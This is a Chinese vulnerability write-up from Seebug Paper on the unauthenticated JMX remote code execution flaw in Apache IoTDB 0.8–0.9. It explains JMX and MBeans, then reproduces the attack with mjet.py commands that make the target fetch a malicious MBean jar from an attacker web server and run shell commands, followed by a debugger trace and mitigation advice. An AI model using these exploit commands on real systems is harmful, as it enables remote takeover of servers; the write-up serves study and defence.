**作者：hu4wufu@白帽汇安全研究院  
核对：r4v3zn@白帽汇安全研究院**

### 前言

#### JMX

`JMX`（`Java Management
Extensions`）是一种`Java`技术，主要为管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。也就是`java`版本的`SNMP`（简单网络管理协议），`JMX`与`SNMP`另一个共同点就是，`JMX`不仅能远程系统读取值，还可以用于调用远程系统的方法。

我们可以看一下整体架构：

![image-20200929200504831](https://images.seebug.org/content/images/2020/09/30/1601433028000-image-20200929200504831.png-w331s)

从上面的架构图可以看到JMX主要分三层，分别是：

1、设备层（`Instrumentation Level`）

主要定义了信息模型。在`JMX`中，各种管理对象以管理构件的形式存在，需要管理时，向`MBean`服务器进行注册。该层还定义了通知机制以及一些辅助元数据类。

设备层其实就是和被管设备通信的模块，对于上层的管理者来说，`Instrumentation`
就是设备，具体设备如何通信，是采用`SNMP`,还是采用`ICMP`，是`MBean`的事情。

该层定义了如何实现`JMX`管理资源的规范。一个`JMX`管理资源可以是一个`Java`应用、一个服务或一个设备，它们可以用`Java`开发，或者至少能用`Java`进行包装，并且能被置入`JMX`框架中，从而成为`JMX`的一个管理构件(`Managed
Bean`)，简称`MBean`。管理构件可以是标准的，也可以是动态的，标准的管理构件遵从`JavaBeans`构件的设计模式；动态的管理构件遵从特定的接口，提供了更大的灵活性。

在`JMX`规范中，管理构件定义如下：它是一个能代表管理资源的`Java`对象，遵从一定的设计模式，还需实现该规范定义的特定的接口。该定义了保证了所有的管理构件以一种标准的方式来表示被管理资源。

管理接口就是被管理资源暴露出的一些信息，通过对这些信息的修改就能控制被管理资源。一个管理构件的管理接口包括：

1) 能被接触的属性值  
2) 能够执行的操作  
3) 能发出的通知事件  
4) 管理构件的构建器

`Standard
MBean`是最简单的`MBean`，它管理的资源必须定义在接口中，然后`MBean`必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的`MBean`为`Hello`，则接口必须为`HelloMBean`。

2、代理层（`Agent Level`）

`Agent`层
用来管理相应的资源，并且为远端用户提供访问的接口。`Agent`层构建在设备层之上，并且使用并管理设备层内部描述的组件。`Agent`层主要定义了各种服务以及通信模型。该层的核心是
`MBeanServer`，所有的`MBean`都要向它注册，才能被管理。注册在`MBeanServer`上的`MBean`并不直接和远程应用程序进行通信，他们通过
协议适配器（Adapter） 和 连接器（`Connector`） 进行通信。通常`Agent`由一个`MBeanServer`和多个系统服务组成。`JMX
Agent`并不关心它所管理的资源是什么。

3、分布服务层（`Distributed Service Level`）

分布服务层关心`Agent`如何被远端用户访问的细节。它定义了一系列用来访问`Agent`的接口和组件，包括`Adapter`和`Connector`的描述。

**MBean**

利用`JMX`，我们可以像托管`bean`一样来管理各种资源。托管`bean`（`MBean`）是遵循`JMX`标准的某些设计规则的`Java
Bean`类。`MBean`可以表示设备、应用程序或需要通过`JMX`管理的任何资源。您可以通过`JMX`来访问这些`MBean`，比如查询属性和调用`Bean`方法。

并不是所有的`java`类都能被管理，只有按照特定格式编写的`java`类才能被`JMX`管理。这种特定格式机制我们称为`MBean`。

`JMX`标准在不同的`MBean`类型之间有所差异，但是，我们这里只处理标准`MBean`。为了成为有效的`MBean`，`Java`类必须：

  * 实现一个接口
  * 提供默认的构造函数（不带任何参数）
  * 遵循某些命名约定，例如实现`getter/setter`方法来读/写属性

创建一个`MBean`，首先需要定义一个接口。下面给出一个最简单的`MBean`示例：

    
    
    package de.mogwailabs.MBeans;
    
    public interface HelloMBean {
       // getter and setter for the attribute "name"
       public String getName();
       public void setName(String newName);
       // Bean method "sayHello"
       public String sayHello(); 
    
    }

下一步是为已定义的接口提供一个实现。注意，其名称应该始终与接口保持一致，除掉后缀`“MBean”`部分。

    
    
    package de.mogwailabs.MBeans;
    public class Hello implements HelloMBean {
         private String name = "MOGWAI LABS";
       // getter/setter for the "name" attribute
       public String getName() { return this.name; }
       public void setName(String newName) { this.name = newName; }
       // Methods
       public String sayHello() { return "hello: " + name; }
    }

**MBean服务器**

`MBean`服务器是一种管理系统`MBean`的服务。开发人员可以按照特定的命名模式在服务器中注册`MBean`。`MBean`服务器将传入的消息转发给已注册的`MBean`。该服务还负责将消息从`MBean`转发给外部组件。

默认情况下，每个`Java`进程都会运行一个`MBean`服务器服务，我们可以通过`ManagementFactory.getPlatformMBeanServer();`来访问它。下面给出的示例代码将“连接”到当前进程的`MBean`服务器，并打印输出所有已注册的`MBean`：

    
    
    package de.mogwailabs.MBeanClient;
    import java.lang.management.ManagementFactory;
    import javax.management.*;
    public class MBeanClient {
           publicstatic void main(String[] args) throws Exception {                  
           // Connect to the MBean server of the current Java process
           MBeanServer server = ManagementFactory.getPlatformMBeanServer();
           System.out.println( server.getMBeanCount() );
           // Print out each registered MBean
            for ( object object :server.queryMBeans(new objectName("*:*"), null) ) {
              System.out.println( ((objectInstance)object).getobjectName() );
           }
        }
    }

要想创建可以通过`MBean`服务器供外部调用的`MBean`实例，则需要使用`objectName`类完成相应的注册。每个`MBean`的名称，不仅要遵循对象命名约定，同时，还必须是独一无二的。名称分为域（通常是包）名和对象名两个部分。对象名称应包含`“type”`属性。如果给定域中只能有一个给定类型的实例，那么除了`type`属性之外，通常不应该有任何其他属性。

对于已经实现的`MBean`，我们需要`MBeanServer`。可以将`MBeanServer`理解为一个`MBean`的仓库，需要监控的`MBean`都需要先注册到仓库中。向`MBeanServer`注册`MBean`有两种方式，一是本地注册，二是远程注册。远程注册就为我们执行任意代码提供了可能。然后`jdk`有一些`MBean`，其中有一个`MBean`叫`mlet`。让我们能够在本地向远端注册`MBean`。

#### 漏洞概况

在`Apache IoTDB
0.9.0`到`0.9.1`和`0.8.0`到`0.8.2`中发现了一个问题。在启动`IoTDB`时，`JMX`端口`31999`无需任何认证即可暴露，然后客户端可以远程执行代码。

这个漏洞原理是基于`RMI`的`JMX`服务，攻击者可以远程注册一个恶意的 `MBean`，再去调用里面的用于执行命令的方法达到攻击效果。

首先是`MBeanServer`提供了一套远程注册`MBean`的机制，本地向`MBeanserver`注册一个`MBean`，也就是`Mlet`，`Mlet`是实现了一个函数`getMBeansFromURL(url)`，这个函数能够加载并实例化我们指定的远程`MBean`，从而导致了我们的恶意`payloadMBean`被加载注册到`MBeanServer`上，导致任意命令执行。

然后让目标机远程加载我们部署的恶意`MBean`，并在目标机上创建这个`MBean`，然后就可以用`JMX`协议控制这个恶意的`MBean`，通过`Runtime`类的`exec`方法执行命令。

### 环境准备

测试环境：`JDK 1.8.0_131`、`jython2.7.0`、`apache-iotdb-0.9.0`

`iotdb`下载地址：<https://archive.apache.org/dist/incubator/iotdb/>

`poc`下载地址：<https://github.com/mogwailabs/mjet>

这里`iotdb`可以下载源码调试，本文采取的是远程调试。

`sbin`目录下的`start-server.sh`配置：

![image-20200927113951505](https://images.seebug.org/content/images/2020/09/30/1601433029000-image-20200927113951505.png-w331s)

`idea`配置：

![image-20200927113641944](https://images.seebug.org/content/images/2020/09/30/1601433029000-image-20200927113641944.png-w331s)

这里`poc`使用了`jython`的环境进行调试，先在历史版本下载所需要的`jython`的版本。

下载地址：<https://search.maven.org/artifact/org.python/jython-installer>

然后安装后配置`idea`，为`Jython`项目配置环境。打开`idea`，打开`Preferences`在`Plugins`下，搜索安装插件`python`，点击`install`：

![image-20200929162917188](https://images.seebug.org/content/images/2020/09/30/1601433029000-image-20200929162917188.png-w331s)

然后就可以创建`jython`项目了。

![image-20200929165101868](https://images.seebug.org/content/images/2020/09/30/1601433029000-image-20200929165101868.png-w331s)

我们将恶意的`jar`包和`mejt.py`拷贝进去。

![image-20200929165224808](https://images.seebug.org/content/images/2020/09/30/1601433030000-image-20200929165224808.png-w331s)

配置`poc`如下：

![image-20200927164231772](https://images.seebug.org/content/images/2020/09/30/1601433030000-image-20200927164231772.png-w331s)

### 漏洞复现

**poc：**

    
    
    java -jar jython-standalone-2.7.0.jar mjet.py 10.10.10.182 31999 install super_secret http://10.10.10.182:8000/ 8000
    
    java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 31999 command super_secret "ls -l" 

首先部署恶意`MBean`，第一个`ip`是易受攻击者`ip`，运行着易受攻击的`JMX`服务，第二个`ip`是攻击者的`ip`，`JMX`服务将连接到攻击者的`Web`服务，以下载有效载荷`jar`文件，`mjet`将在端口`8000`上启动必要的`Web`服务。

成功安装`MBean`后，默认密码将改为命令行提供的密码`super_secret`

    
    
    hu4wufu@bogon mjet-master % java -jar jython-standalone-2.7.0.jar mjet.py 10.10.10.182 31999 install super_secret http://10.10.10.182:8000/ 8000
    
    MJET - MOGWAI LABS JMX Exploitation Toolkit
    ===========================================
    [+] Starting webserver at port 8000   
    [+] Using JMX RMI   
    [+] Connecting to: service:jmx:rmi:///jndi/rmi://10.10.10.182:31999/jmxrmi
    [+] Connected: rmi://10.10.10.182  2
    [+] Loaded javax.management.loading.MLet
    [+] Loading malicious MBean from http://10.10.10.182:8000/
    [+] Invoking: javax.management.loading.MLet.getMBeansFromURL
    10.10.10.182 - - [10/Sep/2020 15:55:33] "GET / HTTP/1.1" 200 -    10.10.10.182 - - [10/Sep/2020 15:55:33] "GET /azmzjazz.jar HTTP/1.1" 200 -    [+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
    [+] Changing default password...
    [+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
    [+] Successfully changed password
    [+] Done

安装有效负载后，我们执行`OS`命令，在目标中运行命令`“ls -l”`

    
    
    hu4wufu@bogon mjet-master % java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 31999 command super_secret "ls -l"
    
    MJET - MOGWAI LABS JMX Exploitation Toolkit
    ===========================================
    [+] Using JMX RMI
    [+] Connecting to: service:jmx:rmi:///jndi/rmi://127.0.0.1:31999/jmxrmi
    [+] Connected: rmi://10.10.10.182  3
    [+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
    [+] Executing command: ls -l
    total 56
    drwxr-xr-x@ 3 hu4wufu  staff    96  9  7 21:43 data
    -rw-------  1 hu4wufu  staff   165  9  7 15:02 nohup.out
    -rwx------@ 1 hu4wufu  staff  2002 11 20  2019 start-client.bat
    -rwx------@ 1 hu4wufu  staff  1556  9  8 18:14 start-client.sh
    -rwx------@ 1 hu4wufu  staff  3126  9  8 16:36 start-server.bat
    -rwx------@ 1 hu4wufu  staff  2054  9  9 14:41 start-server.sh
    -rwx------  1 hu4wufu  staff  1034  8 26  2019 stop-server.bat
    -rwx------  1 hu4wufu  staff   999  8 26  2019 stop-server.sh

![image-20200909210150225](https://images.seebug.org/content/images/2020/09/30/1601433030000-image-20200909210150225.png-w331s)

### 漏洞分析

我们先来看一下远程注册`MBean`的过程，这里`payload`使用的是`jython`环境。

首先来解释一下`poc`，每一个`MBean`都需要实现一个接口，而且这个接口的命名是有讲究的，必须以`MBean`结尾，例如这里是编写了一个`MogwailLabsPayloadMBean`接口，然后我们需要实现这个`MBean`，同样这个实现的命名是去掉对应接口的的`MBean`后缀，也就是`MogwailLabsPayload`。在`MogwailLabsPayload`里边的方法，我们注册到`MBeanServer`后面可以随便调用。

![image-20200929180832958](https://images.seebug.org/content/images/2020/09/30/1601433030000-image-20200929180832958.png-w331s)

根据`poc`，我们来看一下`mjet.py`的`installMode()`函数，往`JMX`里边注册`mjet`。

![image-20200921223740362](https://images.seebug.org/content/images/2020/09/30/1601433031000-image-20200921223740362.png-w331s)

跟进`installMode()`函数，开始连接`JMX`服务。

![image-20200915203906410](https://images.seebug.org/content/images/2020/09/30/1601433031000-image-20200915203906410.png-w331s)

跟进`connectToJMX()`函数，这里首先创建`SSL`连接，然后判断`jmxmp`的类型，这里可知是`jxmrmi`，然后就是确定`JMX`的地址和端口。这里一开始将我们设置的参数带入，包括设置的密码，以及`payload`的`url`地址和端口，还有就是就是`JMX`服务地址和端口。

![image-20200924173930048](https://images.seebug.org/content/images/2020/09/30/1601433031000-image-20200924173930048.png-w331s)

`bean_server`创建结束，主要作用是与`iotDB`里边的`JMX`通信。

接下来跟进去`mjet.py`的`installMBean()`函数，这里`JMX`开始在目标服务器上创建`MBeanjavax.management.loading.MLet`的实例，（然后调用`MLet`实例的`getMBeansFromURL`方法，将`Web`服务器`URL`作为参数进行传递。`JMX`服务将连接到`http`服务器装载的恶意`MBean`对象，也就是事先准备好的`MogwaiLabsPayload`。每个`MBean`都需要都需要一个接口，而且这个接口的命名必须要以`MBean`结尾。

![image-20200915214636603](https://images.seebug.org/content/images/2020/09/30/1601433031000-image-20200915214636603.png-w331s)

开始加载远程的一个恶意的`MBean`。进行一个远程的方法调用，创建一个`javax.management.loading.MLet`的类对象。

![image-20200915223031171](https://images.seebug.org/content/images/2020/09/30/1601433031000-image-20200915223031171.png-w331s)

我们跳到了`iotDB`里边，来看一下如何创建一个的`MLet`，最早是调用了`javax.management.remote.rmi.RMIConnectionImpl:239$createMBean()`方法

可以看到传递过来的方法对象，以及`rmi`服务地址。

![image-20200923224948366](https://images.seebug.org/content/images/2020/09/30/1601433031000-image-20200923224948366.png-w331s)

我们进入`javax.managment.remote.rmi.RMIConnectionImpl:1309$doOperation()`，接下来就是对参数进行操作。

![image-20200921000320995](https://images.seebug.org/content/images/2020/09/30/1601433032000-image-20200921000320995.png-w331s)

跟进去`doOperation()`方法，`operation`为`3`，调用`MBeanServer.createMBean()`方法。

![image-20200916120353535](https://images.seebug.org/content/images/2020/09/30/1601433032000-image-20200916120353535.png-w331s)

直接跟进`javax.management.loading.MLet.java`，调用`mlet`的构造方法，开始实例化一个`Mlet`的对象。

![image-20200923225641405](https://images.seebug.org/content/images/2020/09/30/1601433032000-image-20200923225641405.png-w331s)

![image-20200923225815973](https://images.seebug.org/content/images/2020/09/30/1601433032000-image-20200923225815973.png-w331s)

加载完成`javax.management.loading.MLet`，开始调用`MBean`实例的`getMBeansFromURL`方法，将`Web`服务器`URL`作为参数进行传递。`JMX`服务将从存放恶意类的`http`服务器上解析恶意的`MBean`，装载恶意的`MBean`对象，也就是事先准备好的`MogwaiLabsPayload`。

![image-20200925161529921](https://images.seebug.org/content/images/2020/09/30/1601433032000-image-20200925161529921.png-w331s)

同样进行`javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation`的操作，跟进，我们跟到`javax.management.remote.rmi.RMIConnectionImpl$doOperation()`，这里获取`MBeanServer的getdefaultdomain()`，也就是返回`MBean`的默认域。

![image-20200925162220973](https://images.seebug.org/content/images/2020/09/30/1601433033000-image-20200925162220973.png-w331s)

`com.sun.jmx.interceptor.DefaultMBeanServerInterceptor:1088`，这里`MLet`指定的`MBean`被实例化，并在`MBean`服务器中注册。

![image-20200925163207895](https://images.seebug.org/content/images/2020/09/30/1601433033000-image-20200925163207895.png-w331s)

最终在`com.sun.jmx.mbeanserver.Repository:489`注册了类型为`Mlet`的恶意的`MBean`。

![image-20200927191435314](https://images.seebug.org/content/images/2020/09/30/1601433033000-image-20200927191435314.png-w331s)

`operation`为`14`即`javax.management.remote.rmi.RMIConnectionImpl:1468`然后远程调用`Mlet`的`getMBeansFromURL`方法。

![image-20200927203506347](https://images.seebug.org/content/images/2020/09/30/1601433033000-image-20200927203506347.png-w331s)

`com.sun.jmx.mbeanserver.JmxMBeanServer:801`

![image-20200927203717988](https://images.seebug.org/content/images/2020/09/30/1601433034000-image-20200927203717988.png-w331s)

成功加载恶意的`MBean`。

![image-20200927204705637](https://images.seebug.org/content/images/2020/09/30/1601433034000-image-20200927204705637.png-w331s)

接着往下，根据`poc`，开始修改默认密码为一开始命令行输入的参数。

![image-20200927204003998](https://images.seebug.org/content/images/2020/09/30/1601433034000-image-20200927204003998.png-w331s)

`javax.management.remote.rmi.RMIConnectionImpl$doOperation:1468`
同样先获取恶意`MBean`的实例，反射调用远程方法，这里是`MogwaiLabsPayload`的`changePassword`方法。

![image-20200928220538143](https://images.seebug.org/content/images/2020/09/30/1601433034000-image-20200928220538143.png-w331s)

开始在`MBeanServer`的注册中心检索名称为`MogwaiLabs`的对象，也就是我们之前加载进去的恶意`MBean`。

![image-20200925170614112](https://images.seebug.org/content/images/2020/09/30/1601433034000-image-20200925170614112.png-w331s)

至此，恶意的`MBean`已经加载到服务器上，恶意`MBean`可通过`JMX`获取，攻击者可通过密码执行任意命令。

接下来我们来看下命令执行的过程，首先连接`JMX`服务，传入要执行的命令和之前设置的密码。

![image-20200928174253280](https://images.seebug.org/content/images/2020/09/30/1601433034000-image-20200928174253280.png-w331s)

然后调用`getObjectInstance()`创建之前加载的恶意类的实例。

![image-20200928113944846](https://images.seebug.org/content/images/2020/09/30/1601433034000-image-20200928113944846.png-w331s)

然后反射远程调用任意方法，这里调用的是`MogwaiLabsPayload`的`runCMD`方法。

![image-20200928215114736](https://images.seebug.org/content/images/2020/09/30/1601433035000-image-20200928215114736.png-w331s)

![image-20200928215205880](https://images.seebug.org/content/images/2020/09/30/1601433035000-image-20200928215205880.png-w331s)

最终在调用`ProcessBuilder()`方法执行系统命令。

![image-20200928115941148](https://images.seebug.org/content/images/2020/09/30/1601433035000-image-20200928115941148.png-w331s)

![image-20200928212716976](https://images.seebug.org/content/images/2020/09/30/1601433035000-image-20200928212716976.png-w331s)

### 总结

`JMX`漏洞是一个通用型漏洞，如果遇到`java`系统开启`JMX`服务的都可以使用该漏洞`poc`测试一下。

在`iotDB`的`0.9.2`版本以后是默认设置`JMX_LOCAL="true"`关闭远程访问，当想开启远程连接的时候，`JMX_local`改成`false`，这时候就采用用户名密码控制。

所以启用身份验证来保护`JMX`服务是非常重要的，否则的话，`JMX`服务就很容易被攻击者入侵。实际上，`JMX`自身已经提供了这种功能，包括对`TLS`加密连接的支持。

除了启用身份验证之外，还应该确保`JDK`环境是最新的，因为攻击者可能会尝试使用`Java`反序列化漏洞来利用底层`RMI`实现；如果没有及时更新的话，启用了身份验证也无济于事。

### 参考

  * <https://nosec.org/home/detail/2544.html>
  * <https://github.com/mogwailabs/mjet>
  * <https://github.com/k1n9/k1n9.github.io/blob/aeeb609fe6a25d67bc2dc5f990a501368fb25409/_posts/2017-08-24-attack-jmx-rmi.md>
  * [https://webcache.googleusercontent.com/search?q=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&oq=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&aqs=chrome%E2%80%A669i57j69i58.1641j0j7&sourceid=chrome&ie=UTF-8](https://webcache.googleusercontent.com/search?q=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&oq=cache%3Ahttps%3A%2F%2Fwww.optiv.com%2Fblog%2Fexploiting-jmx-rmi&aqs=chrome%E2%80%A669i57j69i58.1641j0j7&sourceid=chrome&ie=UTF-8)
  * <https://github.com/Maskhe/vuls/tree/master/apache_solr/cve-2019-12409>
  * <https://mp.weixin.qq.com/s/FtXFO1m0me4WErvj141nQQ>
  * <https://www.cnblogs.com/trust-freedom/p/6842332.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1353/>

